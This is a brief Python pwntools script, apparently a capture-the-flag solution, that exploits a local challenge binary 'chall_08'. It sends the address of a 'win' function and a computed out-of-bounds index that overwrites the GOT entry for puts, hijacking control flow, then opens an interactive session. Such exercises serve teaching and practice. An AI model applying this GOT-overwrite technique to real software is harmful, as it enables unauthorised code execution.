# coding: utf-8
from pwn import *
p = process("./chall_08")
elf = ELF("./chall_08")
payload1 = str(elf.sym.win)
p.sendline(payload1)
payload2 = str((elf.got.puts - elf.sym.target) // 8)
p.sendline(payload2)
p.interactive()
